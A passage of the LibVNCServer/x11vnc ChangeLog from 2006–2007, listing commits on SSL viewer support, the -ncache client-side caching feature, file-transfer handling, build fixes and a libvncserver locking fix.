	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/tight-vncviewer-fu
	ll.patch, x11vnc/options.c, x11vnc/options.h, x11vnc/scan.c,
	x11vnc/sslhelper.c, x11vnc/x11vnc.1, x11vnc/x11vnc_defs.c,
	x11vnc/xevents.c: x11vnc: fix build error if libssl is missing or
	--without-ssl supplied.

2007-05-27  runge <runge>

	*
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/tight-vncviewer-fu
	ll.patch: sync ssvnc unix viewer diffs; fix X cursor size.

2007-05-27  runge <runge>

	* classes/ssl/ss_vncviewer,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ss_vncviewer,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ssvnc.tcl,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/_bundle,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/tight-vncviewer-fu
	ll.patch: update java viewer and ssvnc.

2007-05-27  runge <runge>

	* configure.ac, x11vnc/README: configure.ac: fix x11vnc
	--with-system-libvncserver build and add -R link flag.

2007-05-27  runge <runge>

	* libvncserver-config.in: Fix --libs, echo -n doesn't work
	everywhere.  Question: why -R only for Solaris??

2007-05-27  runge <runge>

	* x11vnc/Makefile.am: clobbered x11vnc/Makefile.am by mistake.

2007-05-27  runge <runge>

	* ChangeLog, Makefile.am, configure.ac, prepare_x11vnc_dist.sh,
	x11vnc/README: configure: make more of a split between libvncserver
	and x11vnc pkgs.

2007-05-26  runge <runge>

	* prepare_x11vnc_dist.sh, x11vnc/ChangeLog, x11vnc/README,
	x11vnc/help.c, x11vnc/options.c, x11vnc/unixpw.c, x11vnc/x11vnc.1,
	x11vnc/x11vnc_defs.c: x11vnc: in -unixpw, initial Escape means no
	echo username.

2007-05-22  runge <runge>

	* classes/ssl/ss_vncviewer: update regular SSL viewer jars; update
	ss_vncviewer script.

2007-05-22  runge <runge>

	* x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ss_vncviewer,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ssvnc.tcl,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/tight-vncviewer-fu
	ll.patch: update ssvnc (SSVNC_EXTRA_SLEEP), and unix viewer (1/n
	menu and chat windows)

2007-05-22  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/help.c, x11vnc/options.c,
	x11vnc/x11vnc.1, x11vnc/x11vnc.c, x11vnc/x11vnc_defs.c: x11vnc: set
	things up (NCACHE = -1) to not have -ncache on by default.

2007-05-19  runge <runge>

	* classes/ssl/ultravnc-102-JavaViewer-ssl-etc.patch,
	libvncserver/rfbserver.c, x11vnc/README, x11vnc/x11vnc.1,
	x11vnc/x11vnc.c, x11vnc/x11vnc_defs.c: More fixes to ultra java
	viewer, ultrafilexfer debugging output, fix -loop in .x11vncrc case.

2007-05-17  runge <runge>

	* libvncserver/tightvnc-filetransfer/rfbtightserver.c: Pre-C99
	declaration error.

2007-05-17  runge <runge>

	* libvncserver/rfbserver.c: In rfbSendFileTransferChunk() check
	permitFileTransfer 1st to avoid false alarms.

2007-05-16  runge <runge>

	* prepare_x11vnc_dist.sh: Add UltraViewerSSL.jar, etc. to dist list.

2007-05-16  runge <runge>

	* libvncserver/tightvnc-filetransfer/handlefiletransferrequest.c,
	libvncserver/tightvnc-filetransfer/rfbtightserver.c: Add logging
	output to know when inside tightvnc-filetransfer functions.

2007-05-16  runge <runge>

	* classes/ssl/Makefile.am, classes/ssl/README,
	classes/ssl/ss_vncviewer, classes/ssl/ultra.vnc,
	classes/ssl/ultrasigned.vnc,
	classes/ssl/ultravnc-102-JavaViewer-ssl-etc.patch: Add SSL support
	to UltraVNC Java Viewer (has filetransfer gui).  Fix UltraVNC bugs
	and improve FTP gui a bit.

2007-05-16  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README,
	x11vnc/misc/enhanced_tightvnc_viewer/README,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ss_vncviewer,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ssvnc.tcl,
	x11vnc/sslhelper.c, x11vnc/x11vnc.1, x11vnc/x11vnc.c,
	x11vnc/x11vnc_defs.c: ssvnc: SOCKS support, PORT=, Verify all Certs
	and accepted certs logging. x11vnc SSL debugging output.

2007-05-16  runge <runge>

	* libvncserver/rfbserver.c: Drop client if UltraVNC filetransfer is
	not enabled.

2007-05-07  runge <runge>

	* x11vnc/misc/enhanced_tightvnc_viewer/README,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ss_vncviewer,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ssvnc.tcl,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/_bundle: ssvnc:
	Home dir changing, skip enc warning, memory stick doc.

2007-05-07  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/options.c,
	x11vnc/sslhelper.c, x11vnc/x11vnc.1, x11vnc/x11vnc_defs.c,
	x11vnc/xevents.c: x11vnc: lower -wait and -defer to 20ms. Drop
	client doing ultravnc stuff in -unixpw during login phase.

2007-05-05  runge <runge>

	* x11vnc/README, x11vnc/connections.c, x11vnc/help.c,
	x11vnc/remote.c, x11vnc/sslhelper.c, x11vnc/unixpw.c,
	x11vnc/x11vnc.1, x11vnc/x11vnc.c, x11vnc/xevents.c: filexfer
	warnings and messages.

2007-05-05  runge <runge>

	* configure.ac, x11vnc/ChangeLog, x11vnc/README, x11vnc/help.c,
	x11vnc/options.c, x11vnc/options.h, x11vnc/user.c, x11vnc/x11vnc.1,
	x11vnc/x11vnc.c, x11vnc/x11vnc.h, x11vnc/x11vnc_defs.c: x11vnc: add
	groups handling for -users mode.

2007-05-04  runge <runge>

	* x11vnc/README, x11vnc/help.c, x11vnc/ssltools.h, x11vnc/user.c,
	x11vnc/x11vnc.1, x11vnc/x11vnc_defs.c: x11vnc: add WAITBG=1 env.
	var, add mwm to -create.

2007-05-01  runge <runge>

	* classes/ssl/Makefile.am, classes/ssl/onetimekey,
	classes/ssl/ss_vncviewer, x11vnc/ChangeLog, x11vnc/README,
	x11vnc/connections.c, x11vnc/help.c, x11vnc/sslhelper.c,
	x11vnc/ssltools.h, x11vnc/user.c, x11vnc/x11vnc.1,
	x11vnc/x11vnc_defs.c: ssl: java viewer patches, onetimekey; x11vnc
	setsid/setpgrp and -cc 4 for -create

2007-04-28  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/connections.c,
	x11vnc/help.c, x11vnc/misc/enhanced_tightvnc_viewer/README,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/ssvnc,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/ssvnc_cmd,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ssvnc.tcl,
	x11vnc/misc/enhanced_tightvnc_viewer/build.unix,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/tight-vncviewer-fu
	ll.patch, x11vnc/options.c, x11vnc/options.h, x11vnc/sslhelper.c,
	x11vnc/sslhelper.h, x11vnc/ssltools.h, x11vnc/user.c,
	x11vnc/x11vnc.1, x11vnc/x11vnc.c, x11vnc/x11vnc_defs.c: x11vnc:
	-users sslpeer= option. RFB_SSL_CLIENT_CERT, -ncache 10 default

2007-04-19  runge <runge>

	* prepare_x11vnc_dist.sh, x11vnc/README, x11vnc/x11vnc.1,
	x11vnc/x11vnc.h, x11vnc/x11vnc_defs.c: x11vnc: set to next release
	(0.9.1)

2007-04-19  runge <runge>

	*
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/tight-vncviewer-fu
	ll.patch: Add latest vncviewer patch.

2007-04-19  runge <runge>

	* x11vnc/misc/enhanced_tightvnc_viewer/README,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ss_vncviewer,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ssvnc.tcl,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/stunnel-server.conf,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/_bundle: Sync with
	SSVNC 1.0.15

2007-04-18  runge <runge>

	* x11vnc/README, x11vnc/userinput.c, x11vnc/x11vnc.1,
	x11vnc/x11vnc.h, x11vnc/x11vnc_defs.c: x11vnc: small changes for 0.9
	release.

2007-04-08  runge <runge>

	* prepare_x11vnc_dist.sh: change x11vnc version to 0.9

2007-04-07  dscho <dscho>

	* configure.ac: prepare for release of LibVNCServer 0.9

2007-04-07  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/help.c,
	x11vnc/ssltools.h, x11vnc/user.c, x11vnc/userinput.c,
	x11vnc/x11vnc.1: x11vnc: add gnome, kde, etc. FINDCREATEDISPLAY
	tags.

2007-04-07  runge <runge>

	* classes/ssl/ss_vncviewer,
	classes/ssl/tightvnc-1.3dev7_javasrc-vncviewer-ssl.patch: update
	viewer jars and ss script

2007-04-07  runge <runge>

	* x11vnc/README, x11vnc/connections.c, x11vnc/help.c,
	x11vnc/sslhelper.c, x11vnc/ssltools.h, x11vnc/v4l.c,
	x11vnc/x11vnc.1, x11vnc/x11vnc.c, x11vnc/x11vnc_defs.c: java
	ingoreProxy, fix old libssl free_func problem

2007-04-06  dscho <dscho>

	* AUTHORS, ChangeLog, rfb/rfbclient.h: rfbclient.h: use 'extern "C"'
	to make it convenient to include from C++

2007-04-06  dscho <dscho>

	* AUTHORS, ChangeLog, rfb/rfb.h: rfb.h: Do not misplace guards This buglet made it impossible to double include rfb.h from C++.

2007-03-30  dscho <dscho>

	* prepare_x11vnc_dist.sh: build x11vnc with static libraries (at
	least for now) Maybe at a later stage, we want x11vnc to pick up on existing
	libvncserver.so and libvncclient.so, but right now, x11vnc and the
	libraries progress together (and thus it is better to build static,
	necessarily up-to-date libraries for x11vnc).

2007-03-30  dscho <dscho>

	* AUTHORS, ChangeLog, acinclude.m4, client_examples/Makefile.am,
	configure.ac, contrib/Makefile.am, examples/Makefile.am,
	libvncclient/Makefile.am, libvncserver/Makefile.am, ltmain.sh,
	test/Makefile.am, vncterm/Makefile.am, x11vnc/Makefile.am: Build
	shared libraries per default Thanks to Guillaume Rousse, we now use libtool to build shared
	libraries.

2007-03-25  runge <runge>

	* x11vnc/README, x11vnc/pm.c, x11vnc/scan.c, x11vnc/user.c,
	x11vnc/userinput.c, x11vnc/xevents.c: x11vnc: remove build errors,
	get -ncache working on macosx again.

2007-03-24  runge <runge>

	* libvncserver/cursor.c: Fix short vs. char problem with X cursors.
	Have fg == bg == 0 imply interpolation to B&W.

2007-03-24  runge <runge>

	* classes/ssl/ss_vncviewer,
	classes/ssl/tightvnc-1.3dev7_javasrc-vncviewer-ssl.patch: reverse
	connections for ss_vncviewer.  java one-time-keys.

2007-03-24  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/connections.c,
	x11vnc/help.c, x11vnc/screen.c, x11vnc/sslhelper.c,
	x11vnc/sslhelper.h, x11vnc/tkx11vnc, x11vnc/tkx11vnc.h,
	x11vnc/user.c, x11vnc/x11vnc.1, x11vnc/x11vnc.c,
	x11vnc/x11vnc_defs.c: x11vnc: reverse SSL connections. -sleepin
	option.

2007-03-24  runge <runge>

	* x11vnc/misc/enhanced_tightvnc_viewer/README,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ss_vncviewer,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ssvnc.tcl,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/_bundle,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/tight-vncviewer-fu
	ll.patch: reverse (listening) VNC connections.

2007-03-20  runge <runge>

	* x11vnc/misc/enhanced_tightvnc_viewer/README,
	x11vnc/misc/enhanced_tightvnc_viewer/Windows/README.txt,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ssvnc.tcl,
	x11vnc/misc/enhanced_tightvnc_viewer/build.unix,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/_bundle,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/tight-vncviewer-fu
	ll.patch: ssvnc: sync to 1.0.13 release.

2007-03-20  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/cursor.c, x11vnc/help.c,
	x11vnc/options.c, x11vnc/options.h, x11vnc/remote.c,
	x11vnc/sslhelper.c, x11vnc/user.c, x11vnc/x11vnc.1,
	x11vnc/x11vnc.c, x11vnc/x11vnc_defs.c: x11vnc: -httpsredir,
	x11cursor fix, nc=N login opt, no -ncache betatest for java viewer.

2007-03-20  runge <runge>

	* ChangeLog, libvncserver/httpd.c: Add "Connection: close" to HTTP
	replies.

2007-03-17  dscho <dscho>

	* AUTHORS, ChangeLog, libvncserver/main.c, libvncserver/rfbserver.c: 
	Fix a locking problem in libvncserver There seems to be a locking problem in libvncserver, with respect to
	how condition variables are used.  On certain machines in our lab, when using a vncviewer to view a
	display that has a very high rate of updates, we will occasionally
	see the VNC server process crash.  In one stack trace that was
	obtained, an assertion had tripped in glibc's pthread_cond_wait,
	which was called from clientOutput.  Inspection of clientOutput suggests that WAIT is being called
	incorrectly.  The mutex that protects a condition variable should
	always be locked when calling wait, and on return from the wait will
	still be locked.  The attached patch fixes the locking around this
	condition variable, and one other that I found by grepping the
	source for similar occurrences.  Signed-off-by: Charles Coffing <ccoffing@novell.com>

2007-03-13  runge <runge>

	*
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/tight-vncviewer-fu
	ll.patch: ssvnc: sync src/patches/tight-vncviewer-full.patch

2007-03-13  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/help.c, x11vnc/scan.c,
	x11vnc/screen.c, x11vnc/solid.c, x11vnc/x11vnc.1, x11vnc/x11vnc.c,
	x11vnc/x11vnc_defs.c: x11vnc: fix crash for kde dcop. limit ncache
	beta tester to 96MB viewers.

2007-02-19  runge <runge>

	* x11vnc/misc/enhanced_tightvnc_viewer/Windows/README.txt,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ss_vncviewer,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ssvnc.tcl,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/_getpatches,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/tight-vncviewer-fu
	ll.patch: ssvnc: more fixes for painting problems.

2007-02-19  runge <runge>

	* x11vnc/README, x11vnc/x11vnc.1, x11vnc/x11vnc.c,
	x11vnc/x11vnc_defs.c: x11vnc: fix -users bob= in -inetd mode.

2007-02-19  runge <runge>

	* x11vnc/misc/enhanced_tightvnc_viewer/bin/ssvnc,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/ssvnc_cmd,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ss_vncviewer,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ssvnc.tcl,
	x11vnc/misc/enhanced_tightvnc_viewer/build.unix,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/_bundle,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/tight-vncviewer-fu
	ll.patch: store 1.0.12 snapshot.

2007-02-19  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/x11vnc.1,
	x11vnc/x11vnc.c, x11vnc/x11vnc_defs.c, x11vnc/xevents.c: x11vnc: Get
	ultravnc textchat working with ssvnc.

2007-02-17  runge <runge>

	* x11vnc/README, x11vnc/help.c, x11vnc/sslhelper.c, x11vnc/x11vnc.1: 
	x11vnc: make https fetch in accept_openssl() work again.

2007-02-16  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/allowed_input_t.h,
	x11vnc/connections.c, x11vnc/help.c, x11vnc/keyboard.c,
	x11vnc/keyboard.h, x11vnc/remote.c, x11vnc/screen.c,
	x11vnc/tkx11vnc, x11vnc/tkx11vnc.h, x11vnc/unixpw.c, x11vnc/user.c,
	x11vnc/x11vnc.1, x11vnc/x11vnc_defs.c, x11vnc/xevents.c: x11vnc: add
	Files mode to user controlled input. more ultra/tight filexfer
	tweaks.  rfbversion remote control. noncache/nc unixpw user opt.

2007-02-16  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/avahi.c,
	x11vnc/connections.c, x11vnc/help.c, x11vnc/options.c,
	x11vnc/options.h, x11vnc/remote.c, x11vnc/screen.c,
	x11vnc/ssltools.h, x11vnc/tkx11vnc, x11vnc/tkx11vnc.h,
	x11vnc/unixpw.c, x11vnc/user.c, x11vnc/x11vnc.1, x11vnc/x11vnc.c,
	x11vnc/x11vnc.h, x11vnc/x11vnc_defs.c, x11vnc/xevents.c: x11vnc:
	tightvnc filetransfer off by default. FINDCREATEDISPLAY geometry.

2007-02-12  runge <runge>

	* configure.ac, x11vnc/ChangeLog, x11vnc/Makefile.am,
	x11vnc/README, x11vnc/avahi.c, x11vnc/avahi.h, x11vnc/cleanup.c,
	x11vnc/help.c, x11vnc/options.c, x11vnc/options.h, x11vnc/remote.c,
	x11vnc/screen.c, x11vnc/tkx11vnc, x11vnc/tkx11vnc.h, x11vnc/user.c,
	x11vnc/win_utils.c, x11vnc/x11vnc.1, x11vnc/x11vnc.c,
	x11vnc/x11vnc_defs.c: x11vnc: add avahi (aka
	mDNS/Zeroconf/Bonjour...) support thanks to Diego Petteno. add -find
	-create

2007-02-12  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/connections.c,
	x11vnc/help.c, x11vnc/options.c, x11vnc/options.h, x11vnc/pm.c,
	x11vnc/remote.c, x11vnc/sslhelper.c, x11vnc/ssltools.h,
	x11vnc/tkx11vnc, x11vnc/tkx11vnc.h, x11vnc/unixpw.c, x11vnc/user.c,
	x11vnc/x11vnc.1, x11vnc/x11vnc.c, x11vnc/x11vnc.h,
	x11vnc/x11vnc_defs.c, x11vnc/xevents.c, x11vnc/xevents.h,
	x11vnc/xwrappers.c: x11vnc: -grabalways, -forcedpms, -clientdpms,
	-noserverdpms, -loopbg, -svc, -xdmsvc

2007-02-10  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/connections.c,
	x11vnc/pm.c, x11vnc/pm.h, x11vnc/pointer.c, x11vnc/pointer.h,
	x11vnc/scan.c, x11vnc/screen.c, x11vnc/ssltools.h, x11vnc/unixpw.c,
	x11vnc/unixpw.h, x11vnc/user.c, x11vnc/user.h, x11vnc/userinput.c,
	x11vnc/x11vnc.1, x11vnc/x11vnc.c, x11vnc/x11vnc_defs.c,
	x11vnc/xevents.c, x11vnc/xevents.h: x11vnc: watch textchat, etc in
	unixpw, implement kbdReleaseAllKeys, setSingleWindow,
	setServerInput. watch for OpenGL apps breaking XDAMAGE.

2007-02-05  runge <runge>

	* x11vnc/misc/enhanced_tightvnc_viewer/README,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/ssvnc,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ss_vncviewer,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ssvnc.tcl,
	x11vnc/misc/enhanced_tightvnc_viewer/build.unix,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/_bundle,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/tight-vncviewer-fu
	ll.patch: ssvnc 1.0.11 files.

2007-02-05  runge <runge>

	* prepare_x11vnc_dist.sh, x11vnc/README, x11vnc/x11vnc.1,
	x11vnc/x11vnc.h, x11vnc/x11vnc_defs.c: Setup for x11vnc 0.8.5

2007-02-01  dscho <dscho>

	* ChangeLog, libvncclient/rfbproto.c, libvncclient/vncviewer.c,
	rfb/rfbclient.h: LibVNCClient: some users do not want to get
	whole-screen updates; introduce client->updateRect for that

2007-02-01  dscho <dscho>

	* libvncclient/zrle.c: sometimes zrle sends too many bytes; play
	safe

2007-01-31  runge <runge>

	* x11vnc/README, x11vnc/keyboard.c, x11vnc/pointer.c,
	x11vnc/screen.c, x11vnc/solid.c, x11vnc/userinput.c,
	x11vnc/xdamage.c, x11vnc/xevents.c: fix warnings.

2007-01-31  runge <runge>

	* ChangeLog: libvncclient changes.

2007-01-31  runge <runge>

	* x11vnc/ChangeLog, x11vnc/Makefile.am, x11vnc/README,
	x11vnc/cleanup.c, x11vnc/connections.c, x11vnc/cursor.c,
	x11vnc/help.c, x11vnc/keyboard.c, x11vnc/macosx.c,
	x11vnc/macosxCG.c, x11vnc/macosxCGS.c,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/tight-vncviewer-ne
	wfbsize.patch, x11vnc/options.c, x11vnc/options.h, x11vnc/params.h,
	x11vnc/pointer.c, x11vnc/remote.c, x11vnc/scan.c, x11vnc/screen.c,
	x11vnc/screen.h, x11vnc/solid.c, x11vnc/solid.h, x11vnc/ssltools.h,
	x11vnc/tkx11vnc, x11vnc/tkx11vnc.h, x11vnc/unixpw.c,
	x11vnc/unixpw.h, x11vnc/user.c, x11vnc/userinput.c, x11vnc/util.c,
	x11vnc/x11vnc.1, x11vnc/x11vnc.c, x11vnc/x11vnc.h,
	x11vnc/x11vnc_defs.c, x11vnc/xdamage.c, x11vnc/xdamage.h,
	x11vnc/xevents.c: x11vnc: -reflect, -N. -ncache, FINDDISPLAY,
	FINDCREATEDISPLAY, improvements.  MODTWEAK_LOWEST workaround.

2007-01-31  runge <runge>

	* Makefile.am, libvncclient/cursor.c, libvncclient/rfbproto.c,
	libvncclient/vncviewer.c, prepare_x11vnc_dist.sh, rfb/rfbclient.h: 
	libvncclient: add GotCursorShape() and GotCopyRect(); x11vnc dep on
	libvncclient

2007-01-25  dscho <dscho>

	* libvncserver/rfbserver.c: compile fix for MinGW

2007-01-25  dscho <dscho>

	* VisualNaCro/Makefile.am: complain when SWIG is not present, but
	needed

2007-01-25  dscho <dscho>

	* VisualNaCro/configure.ac: Complain if libvncserver-config was not
	found in PATH

2007-01-10  runge <runge>

	* x11vnc/README, x11vnc/help.c, x11vnc/options.c, x11vnc/options.h,
	x11vnc/remote.c, x11vnc/scan.c, x11vnc/screen.c, x11vnc/tkx11vnc,
	x11vnc/tkx11vnc.h, x11vnc/userinput.c, x11vnc/userinput.h,
	x11vnc/x11vnc.1, x11vnc/x11vnc.c, x11vnc/x11vnc.h,
	x11vnc/x11vnc_defs.c, x11vnc/xdamage.c, x11vnc/xevents.c,
	x11vnc/xinerama.c, x11vnc/xrandr.h: some -ncache performance
	improvements, rootpixmap watching, gnome wm heuristics

2007-01-09  runge <runge>

	* x11vnc/README, x11vnc/userinput.c, x11vnc/x11vnc.1,
	x11vnc/x11vnc_defs.c: Fix old compiler error; fix warnings.

2007-01-09  runge <runge>

	* x11vnc/README, x11vnc/help.c, x11vnc/options.c, x11vnc/options.h,
	x11vnc/remote.c, x11vnc/screen.c, x11vnc/solid.c, x11vnc/solid.h,
	x11vnc/userinput.c, x11vnc/x11vnc.1, x11vnc/x11vnc.c,
	x11vnc/x11vnc_defs.c, x11vnc/xdamage.c: more speed and accuracy
	improvements to -ncache mode.

2007-01-07  runge <runge>

	* x11vnc/README, x11vnc/options.c, x11vnc/userinput.c,
	x11vnc/winattr_t.h, x11vnc/x11vnc.1, x11vnc/x11vnc.h,
	x11vnc/x11vnc_defs.c, x11vnc/xdamage.c: changes to ncache cache
	aging and xdamage skipping

2007-01-04  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/userinput.c,
	x11vnc/x11vnc.1, x11vnc/x11vnc.c, x11vnc/x11vnc_defs.c,
	x11vnc/xdamage.c: x11vnc: more -ncache improvements.

2007-01-02  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/help.c, x11vnc/options.c,
	x11vnc/options.h, x11vnc/remote.c, x11vnc/scan.c,
	x11vnc/ssltools.h, x11vnc/tkx11vnc, x11vnc/tkx11vnc.h,
	x11vnc/user.c, x11vnc/userinput.c, x11vnc/x11vnc.1,
	x11vnc/x11vnc.c, x11vnc/x11vnc.h, x11vnc/x11vnc_defs.c,
	x11vnc/xevents.c, x11vnc/xevents.h: x11vnc: more -ncache
	improvements.

2006-12-29  runge <runge>

	* x11vnc/8to24.c, x11vnc/README, x11vnc/cursor.c, x11vnc/options.c,
	x11vnc/options.h, x11vnc/pointer.c, x11vnc/screen.c,
	x11vnc/selection.c, x11vnc/userinput.c, x11vnc/util.c,
	x11vnc/win_utils.c, x11vnc/x11vnc.1, x11vnc/x11vnc.c,
	x11vnc/x11vnc_defs.c, x11vnc/xevents.c, x11vnc/xwrappers.c: x11vnc
	-ncache on by default for beta test.  fix -nofb & -rawfb modes.

2006-12-28  runge <runge>

	* x11vnc/README, x11vnc/userinput.c, x11vnc/win_utils.c: a couple
	more warnings...

2006-12-28  runge <runge>

	* x11vnc/8to24.c, x11vnc/README, x11vnc/connections.c,
	x11vnc/cursor.c, x11vnc/gui.c, x11vnc/keyboard.c, x11vnc/macosx.c,
	x11vnc/macosx.h, x11vnc/macosxCG.c, x11vnc/macosxCGS.c,
	x11vnc/misc/enhanced_tightvnc_viewer/README,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/ssvnc_cmd,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ssvnc.tcl,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/_bundle,
	x11vnc/nox11_funcs.h, x11vnc/pointer.c, x11vnc/remote.c,
	x11vnc/scan.c, x11vnc/screen.c, x11vnc/selection.c, x11vnc/solid.c,
	x11vnc/userinput.c, x11vnc/util.c, x11vnc/win_utils.c,
	x11vnc/xevents.c, x11vnc/xrandr.c, x11vnc/xrecord.c,
	x11vnc/xwrappers.c: still more compiler warnings; ssvnc 1.0.9 sync.

2006-12-28  runge <runge>

	* x11vnc/8to24.c, x11vnc/README, x11vnc/cleanup.c,
	x11vnc/connections.c, x11vnc/cursor.c, x11vnc/macosx.c,
	x11vnc/macosx.h, x11vnc/macosxCG.c, x11vnc/macosxCG.h,
	x11vnc/macosxCGP.c, x11vnc/macosxCGS.c, x11vnc/macosxCGS.h,
	x11vnc/scan.c, x11vnc/screen.c, x11vnc/sslhelper.c,
	x11vnc/uinput.c, x11vnc/userinput.c, x11vnc/v4l.c,
	x11vnc/win_utils.c, x11vnc/xevents.c, x11vnc/xwrappers.c: more
	compiler warnings cleanup.

2006-12-28  runge <runge>

	* x11vnc/8to24.c, x11vnc/README, x11vnc/connections.c,
	x11vnc/cursor.c, x11vnc/gui.c, x11vnc/keyboard.c, x11vnc/macosx.c,
	x11vnc/macosxCG.c, x11vnc/pointer.c, x11vnc/scan.c,
	x11vnc/screen.c, x11vnc/solid.c, x11vnc/user.c, x11vnc/userinput.c,
	x11vnc/userinput.h, x11vnc/win_utils.c, x11vnc/xwrappers.c,
	x11vnc/xwrappers.h: x11vnc: clean up compiler warnings.

2006-12-28  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/cleanup.c,
	x11vnc/connections.c, x11vnc/cursor.c, x11vnc/cursor.h,
	x11vnc/help.c, x11vnc/keyboard.c, x11vnc/macosx.c, x11vnc/macosx.h,
	x11vnc/macosxCGS.c, x11vnc/macosxCGS.h, x11vnc/options.c,
	x11vnc/options.h, x11vnc/pointer.c, x11vnc/remote.c, x11vnc/scan.c,
	x11vnc/scan.h, x11vnc/screen.c, x11vnc/tkx11vnc, x11vnc/tkx11vnc.h,
	x11vnc/userinput.c, x11vnc/userinput.h, x11vnc/winattr_t.h,
	x11vnc/x11vnc.1, x11vnc/x11vnc.c, x11vnc/x11vnc_defs.c,
	x11vnc/xevents.c, x11vnc/xrecord.c, x11vnc/xwrappers.c,
	x11vnc/xwrappers.h: x11vnc: more work on -ncache.

2006-12-17  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/help.c, x11vnc/options.c,
	x11vnc/options.h, x11vnc/remote.c, x11vnc/scan.c, x11vnc/screen.c,
	x11vnc/unixpw.c, x11vnc/unixpw.h, x11vnc/userinput.c,
	x11vnc/userinput.h, x11vnc/winattr_t.h, x11vnc/x11vnc.1,
	x11vnc/x11vnc.c, x11vnc/x11vnc.h, x11vnc/x11vnc_defs.c,
	x11vnc/xevents.c, x11vnc/xinerama.c: x11vnc: first pass at
	client-side caching, -ncache option.

2006-12-17  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/help.c, x11vnc/options.c,
	x11vnc/options.h, x11vnc/x11vnc.1, x11vnc/x11vnc.c,
	x11vnc/x11vnc_defs.c, x11vnc/xinerama.c: x11vnc: make -xwarppointer
	the default if xinerama is active.

2006-12-16  runge <runge>

	* rfb/rfbproto.h: Move our rfbEncodings numbers out of the TightVNC
	range.

2006-12-15  runge <runge>

	* libvncserver/auth.c: fix typo.

2006-12-13  runge <runge>

	* ChangeLog: Remove stray "-permitfiletransfer  permit file transfer
	support" output

2006-12-13  runge <runge>

	* libvncserver/cargs.c: Remove stray ""-permitfiletransfer    permit
	file transfer support" output.

2006-12-11  runge <runge>

	* x11vnc/README, x11vnc/macosxCG.c, x11vnc/macosxCGS.c,
	x11vnc/x11vnc.1, x11vnc/x11vnc.c, x11vnc/x11vnc_defs.c: cleanup some
	comments.

2006-12-10  runge <runge>

	* x11vnc/misc/enhanced_tightvnc_viewer/README,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/ssvnc_cmd: sync etv 1.0.8

2006-12-10  runge <runge>

	* classes/ssl/tightvnc-1.3dev7_javasrc-vncviewer-ssl.patch,
	x11vnc/ChangeLog, x11vnc/README, x11vnc/cleanup.c,
	x11vnc/cleanup.h, x11vnc/connections.c, x11vnc/gui.c,
	x11vnc/help.c, x11vnc/misc/Makefile.am, x11vnc/pointer.c,
	x11vnc/screen.c, x11vnc/screen.h, x11vnc/solid.c,
	x11vnc/sslhelper.c, x11vnc/ssltools.h, x11vnc/user.c, x11vnc/v4l.c,
